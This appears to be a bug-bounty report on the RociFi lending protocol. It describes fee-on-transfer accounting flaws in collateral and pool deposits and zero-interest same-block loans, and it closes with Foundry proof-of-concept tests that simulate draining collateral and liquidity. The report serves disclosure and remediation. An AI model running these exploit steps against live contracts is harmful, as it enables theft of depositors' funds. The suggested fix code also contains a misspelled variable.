## Description

## Bug Description

In this report 3 different issues will be described that, as a whole, will cause a catastrophe in the protocol if a particular event happens.

**First Issue: Bad collateral accounting when having fee-on-transfer tokens**

Currently, the RociFi protocol supports 7 tokens as collateral, and one of them is `USDT`. This token has a feature in the original contract on the Ethereum Network that allows for a fee-on-transfer. This means that at any moment that feature can get activated and collect a fee for every `USDT` transfer. The Polygon `USDT` contract is upgradeable so we can assume that if the fee is activated on mainnet, it would also be activated on Polygon.

Now, if that scenario occurs, it'd be a catastrophe for the RociFi protocol and is possible that in a matter of seconds all `USDT` used as collateral could be stealed by malicious actors. All of this could happen before any RociFi dev could be aware of the issue and stop the contract.

This issue is because in the `CollateralManager` contract, `addCollateral` function, there's no check for the actual tokens received assuming that no fee will be taken. This dangerous assumption leads to the contract to account more tokens to a user while maybe a smaller amount of tokens has been received.

```solidity
function addCollateral(
    address user,
    IERC20MetadataUpgradeable token,
    uint256 amount
) external payable checkFreezerOrUser(user) ifNotPaused {
    require(amount > 0 || msg.value > 0, Errors.ZERO_VALUE);
    require(allowedCollaterals.includes[token], Errors.COLLATERAL_MANAGER_TOKEN_NOT_SUPPORTED);

    // {...}

    // @audit If a fee is taken, `amount` is not the real amount received
    collateralToUserToAmount[token][user] += amount;
    emit CollateralAdded(user, token, amount);
}
```

In a scenario like this, because the internal accounting of the contract will be more than it is really, with every user that deposits collateral with a fee-on-transfer token, the situation will worsen leading to the insolvency of the protocol. When users try to withdraw these tokens, it will arrive a point where the contract won't have enough tokens to give the depositors and will revert every transaction trying to withdraw these tokens.

In other words, when depositing collateral with a fee-on-transfer token, the fee will impact the contract instead of the user doing the deposit. So when withdrawing, that user will receive more than it should because the contract didn't account for the token fee.

Given that situation, in a case of a 1% fee-on-transfer on `USDT`, if a user deposits 100K `USDT` as collateral, when withdrawing those it would receive 1k extra tokens that shouldn't receive. So the contract would lose 1K tokens.

If the collateral contract holds 1K USDT and the fee got activated, in the same block the transaction to activate the fee is sent, a MEV bot could deposit 100K `USDT` as collateral and when withdrawing those, the `CollateralManager` contract will be left with 0 `USDT` tokens.

*And what is the benefit for someone to do that?*

Here it comes the second issue:

**Second Issue: The zero interest flash loans that RociFi is currently offering.**

In this protocol, as proved in the `POC`, is possible to deposit collateral, borrow some tokens, repay them and claim the collateral in the same transaction. All of this without paying one single `wei` of interest or fee to the protocol.

This issue is because of the following function:

```solidity
function calculateInterest(
    uint256 apr,
    uint256 timeFrame,
    uint256 amount
) internal pure returns (uint256) {
    // @audit If timeFrame is zero or a small number, the result will round to zero
    return (amount * apr * timeFrame) / (100 ether * ONE_YEAR);
}
```

The varialble `timeFrame` is the seconds passed from the last repay to the current timestamp. If this value is zero or a small amount, the interest will round to zero leaving the user with a zero interest loan. Later, there's no check that prevents this behaviour so this allows the zero interest loans.

Right now, this issue of the zero interest loans is not that important because it doesn't directly steal money from other users or the protocol but it could be a real issue if a fee-on-transfer is activated on a token. In that case, the free flash loans plus the wrong accounting of the fee would incentivise the bots and malicious users to take advantage of the protocol and steal all `USDT` used as collateral.

In the POC below, this issue is proven to be real and executable right now.

These 2 issues, given the scenario of a fee-on-transfer token, will result in a complete theft of the user's funds used as collateral.

And finally, our third issue.

**Third Issue: Bad liquidity accounting on the `USDT` and `USDC` pools when fee-on-transfer is activated.**

When depositing liquidity in both pools, the `deposit` function doesn't check if the `underlyingTokenAmount` specified by the user is the real amount received by the contract. In an event of a fee-on-transfer on `USDC` or `USDT`, a big depositor could steal all the liquidity in the pools. Here's the function:

```solidity
function deposit(uint256 underlyingTokenAmount, string memory version)
    external
    checkVersion(version)
    ifNotPaused
{
    uint256 rTokenAmount = stablecoinToRToken(underlyingTokenAmount);

    lastDepositTimestamp[msg.sender] = block.timestamp;
    // @audit The contract doesn't check if underlyingTokenAmount of tokens has actually been received
    poolValue += underlyingTokenAmount;

    _mint(msg.sender, rTokenAmount);

    underlyingToken.safeTransferFrom(msg.sender, address(this), underlyingTokenAmount);

    emit LiquidityDeposited(block.timestamp, msg.sender, underlyingTokenAmount, rTokenAmount);
}
```

In this case, the depositors would receive more `rTokenAmount` than they should so when withdrawing they'd be stealing assets from other depositors. In this scenario, any user would be incentivised to do that because the protocol is charging the fee for the transfer to the current users instead of the user that is depositing.

One could argue:

**But it's highly improbable that Tether would activate the fee-on-transfer...**

Better safe than sorry. And `USDT` is only an example, `USDC` also has an upgradeable contract in the Polygon network. In web3 anything could happen and better prepare for the worse than appear tomorrow in the new article of **rekt.news** because all the user's money is lost.

I've gone through the RociFi docs multiple times and there's no mention to fee-on-transfer tokens. It seems like this scenario descrived above could take by surprise the protocol and make the users lose lots of money.

This 3 main issues described above are:

1. Zero interest flash loans
2. Bad accounting in `CollateralManager` when having fee-on-transfer tokens
3. Bad accounting in `USDT` and `USDC` pools if fee-on-transfer got activated

These 3 isolated there're not that important but if considered as a whole, they could cause the RociFi users to lose most of their money on the Protocol destroying the good reputation RociFi currently has.

## Impact

Right now the `CollateralManager` contract owns 600 `USDT` tokens and 2.970 `USDC` tokens. In a case of a fee-on-transfer on any of these tokens would result in a complete loss of the assets.

Also, the `USDC` pool holds 16.941 tokens and the `USDT` pool holds 25.688 tokens. This funds will also be in risk if the fee-on-transfer got activated.

So, performing the sum, there are **26.288** `USDT` (the more probable fee-on-transfer token) and **22.911** `USDC` at risk.

Moreover, we have to consider that in the case of not fixing these issues, in a future RociFi could add some more tokens as collateral and have the same problem is the fee-on-transfer got activated on those.

## Risk Breakdown

Difficulty to Exploit: Easy
Weakness: 8
CVSS2 Score: 8.7

## Recommendation

**In the `CollateralManager` contract 2 options are presented:**

1. Check in the `addCollateral` function that the `amount` specified by the user is the amount of tokens received and revert otherwise.
2. Perform the same check in `addCollateral` function and only deposit the collateral amount that the contract actually has received.

**Also, in the `USDC` and `USDT` pools there are similar options:**

1. Check in the `deposit` function if the `underlyingTokenAmount` specified by the user is the amount of tokens received and revert otherwise.
2. Perform the same check in `deposit` and only deposit the liquidity tokens that the contract actually received.

**Regarding the zero interest flash loans:**

In the `repay` function, check that the `interestAccrued` is above zero. This way the contract can prevent the users paying in shorts amounts of time the loan to get zero interest.

```solidity
function repay(
    uint256 loanId,
    uint256 amount,
    string memory version
) external ifNotPaused nonReentrant checkVersion(version) {
    require(amount > 0, Errors.LOAN_MANAGER_ZERO_REPAY);

    LoanLib.Loan storage loan = _loans[loanId];

    require(loan.amount > 0, Errors.LOAN_MANAGER_LOAN_AMOUNT_ZERO);

    uint256 interestAccrued = getInterest(loanId, block.timestamp);
    // @audit This way we prevent zero interest loans
    require(intereseAccrued > 0);

    // {...}
}
```

## References

[https://github.com/d-xo/weird-erc20#fee-on-transfer](https://github.com/d-xo/weird-erc20#fee-on-transfer)

## Proof of Concept

Here is the 3 tests proving the 3 issues mentioned before:
To run the tests, clone the following foundry repo:
[https://github.com/santipu03/foundry-RociFi](https://github.com/santipu03/foundry-RociFi)

```solidity
/**
 * @dev The user deposits 75K USDT as collateral, do something and claim the back the collateral.
 * @notice The USDT transfers 2 times (deposit and claim), both fees should impact the user but the fee on deposit impacts the contract
 *         Given that 1% of 75K is 750, that is the amount stealed from the contract (is collateral of other users)
 */
function test_stealCollateralWhenFeeOnTransfer() public {
    // Give 75K USDT to our user for the exploit
    uint256 amountToExploit = 75_000e6; // 75k USDT
    changePrank(usdtWhale);
    usdt.transfer(user, amountToExploit);
    assertGe(usdt.balanceOf(user), amountToExploit);
    changePrank(user);

    // Deploy mock usdt with fee-on-transfer (1% fee) and set that code to the official usdt address
    // The key here is that now the usdt address has the same storage as before but with a different code (fee-on-transfer code)
    MockERC20FoT upgradedUSDT = new MockERC20FoT(6);
    bytes memory contractCode = address(upgradedUSDT).code;
    vm.etch(address(usdt), contractCode);

    // Save the initial USDT balances
    uint256 userBalanceBefore = usdt.balanceOf(user);
    uint256 managerBalanceBefore = usdt.balanceOf(address(collateralManager));

    console.log("BEFORE THE EXPLOIT: ");
    console.log("===================");
    console.log("Manager USDT Balance: ", managerBalanceBefore / 1e6, "USDT");
    console.log("User USDT Balance:    ", userBalanceBefore / 1e6, "USDT");
    console.log("===================\n\n");

    // Approve USDT and deposit as collateral (75K USDT)
    usdt.approve(address(collateralManager), amountToExploit);
    collateralManager.addCollateral(user, usdt, amountToExploit);

    // Check collateral deposited, the contract acocunts for 75K but has received 74.250K
    uint256 collateral = collateralManager.collateralToUserToAmount(usdt, user);
    uint256 userBalanceAfter = usdt.balanceOf(user);
    uint256 managerBalanceAfter = usdt.balanceOf(address(collateralManager));
    assertEq(collateral, amountToExploit);
    assertEq(userBalanceBefore - amountToExploit, userBalanceAfter);
    assertEq(managerBalanceBefore + amountToExploit - (amountToExploit / 100), managerBalanceAfter);


    // Here the user could get a zero interest flash loan with the collateral deposited (check last test)


    // Now we claim the collateral
    collateralManager.claimCollateral(user, usdt, amountToExploit);

    // Check that collateral has been received
    uint256 managerBalanceFinal = usdt.balanceOf(address(collateralManager));
    uint256 userBalanceFinal = usdt.balanceOf(user);

    // managerBalanceFinal should be the same as managerBalanceBefore, but it's not because the fee
    assertEq(managerBalanceFinal + (amountToExploit / 100), managerBalanceBefore);
    assertEq(userBalanceFinal + (amountToExploit / 100), userBalanceBefore);

    // The logs show the manager balance has decreased from 795 USDT to 45 USDT
    console.log("AFTER THE EXPLOIT: ");
    console.log("===================");
    console.log("Manager USDT Balance: ", managerBalanceFinal / 1e6, "USDT");
    console.log("User USDT Balance:    ", userBalanceFinal / 1e6, "USDT");
    console.log("===================");
}

/**
 * @dev The user deposits 1.5M USDT tokens as liquidity in the USDT pool (it'd be the same in USDC pool) and when withdrawing, it receives more than it should
 * @notice The USDT transfer to deposit it affects the contract instead of the user so when withdrawing is effectively stealing assets. 
 */
function test_stealLiquidityWhenFeeOnTransfer() public {
    // Give 1.5M USDT to our user for the exploit
    uint256 amountToExploit = 1_500_000e6;
    changePrank(usdtWhale);
    usdt.transfer(user, amountToExploit);
    assertGe(usdt.balanceOf(user), amountToExploit);
    changePrank(user);

    // Deploy mock usdt with fee-on-transfer (1% fee) and set that code to the official usdt address
    // The key here is that now the usdt address has the same storage as before but with a different code (fee-on-transfer code)
    MockERC20FoT upgradedUSDT = new MockERC20FoT(6);
    bytes memory contractCode = address(upgradedUSDT).code;
    vm.etch(address(usdt), contractCode);

    // Save the initial USDT balances
    uint256 userBalanceBefore = usdt.balanceOf(user);
    uint256 poolBalanceBefore = usdt.balanceOf(address(usdtPool));

    console.log("BEFORE THE EXPLOIT: ");
    console.log("===================");
    console.log("Pool USDT Balance: ", poolBalanceBefore / 1e6, "USDT");
    console.log("User USDT Balance: ", userBalanceBefore / 1e6, "USDT");
    console.log("===================\n\n");

    // Approve 1.5M USDT to the pool and deposit
    usdt.approve(address(usdtPool), amountToExploit);
    usdtPool.deposit(amountToExploit,"2.0.0");

    // Advance 1 block and withdraw all rUSDT user has
    vm.warp(block.timestamp + 1);
    uint256 amountToWithdraw = MockERC20(address(usdtPool)).balanceOf(user);
    usdtPool.withdraw(amountToWithdraw,"2.0.0");

    // Save final USDT balances
    uint256 poolBalanceAfter = usdt.balanceOf(address(usdtPool));
    uint256 userBalanceAfter = usdt.balanceOf(user);

    // The logs show pool balance has decreased from 15.192 USDT to 192 USDT
    console.log("AFTER THE EXPLOIT: ");
    console.log("===================");
    console.log("Pool USDT Balance: ", poolBalanceAfter / 1e6, "USDT");
    console.log("User USDT Balance: ", userBalanceAfter / 1e6, "USDT");
    console.log("===================");
}

/**
 * @dev Here we add 1000 USDT as collateral, we borrow 1000 USDC, repay it in the same block and claim the back the collateral.
 * @notice All operations here are without paying any fees to RociFi protocol
 */
function test_zeroInterestFlashLoan() public {
    // Give 1K USDT to our user for the exploit
    uint256 amountToExploit = 1000e6;
    changePrank(usdtWhale);
    usdt.transfer(user, amountToExploit);
    assertGe(usdt.balanceOf(user), amountToExploit);
    changePrank(user);

    // Save user USDT balance and approve it to collateral mananger
    uint256 userBalanceBefore = usdt.balanceOf(user);
    usdt.approve(address(collateralManager), amountToExploit);

    // Add 1000 USDT as collateral
    collateralManager.addCollateral(user, usdt, amountToExploit);    

    // Check that collateral has been added
    uint256 collateral = collateralManager.collateralToUserToAmount(usdt, user);
    uint256 userBalanceAfter = usdt.balanceOf(user);
    assertEq(collateral, amountToExploit);
    assertEq(userBalanceBefore, userBalanceAfter + amountToExploit);

    // Save USDC balance
    uint256 balanceBeforeBorrow = usdc.balanceOf(user);

    // Borrow 1000 USDC from the pool
    loanManager.borrow(amountToExploit, usdcPool, usdt, 100e18 ,604800, "2.0.3");

    // Save USDC balance and assert that the amount has been received
    uint256 balanceAfterBorrow = usdc.balanceOf(user);
    assertEq(balanceBeforeBorrow, balanceAfterBorrow - amountToExploit);

    // Find loanID and assert the amount borrowed is 1K USDC (id is 3 because the address we are using has already created some loans)
    uint256 loanId = loanManager.userLoanIds(user, 3);
    LoanLib.Loan memory loan = loanManager.loans(loanId);
    assertEq(loan.amount, amountToExploit);

    // Approve USDC tokens to repay loan
    usdc.approve(address(loanManager), amountToExploit);

    // Repay entire loan
    loanManager.repay(loanId, amountToExploit, "2.0.3");

    // Assert that the loan has been payed
    loan = loanManager.loans(loanId);
    assertEq(loan.amount, 0);

    // Check that the USDC borrowed has been repaid
    uint256 balanceFinal = usdc.balanceOf(user);
    assertEq(balanceBeforeBorrow, balanceFinal);
    assertEq(balanceAfterBorrow - amountToExploit, balanceFinal);

    // Withdraw collateral
    collateralManager.claimCollateral(user, usdt, amountToExploit);

    // Check that collateral has been received
    assertEq(userBalanceAfter + amountToExploit, usdt.balanceOf(user));
    assertEq(userBalanceBefore, usdt.balanceOf(user));
}
```
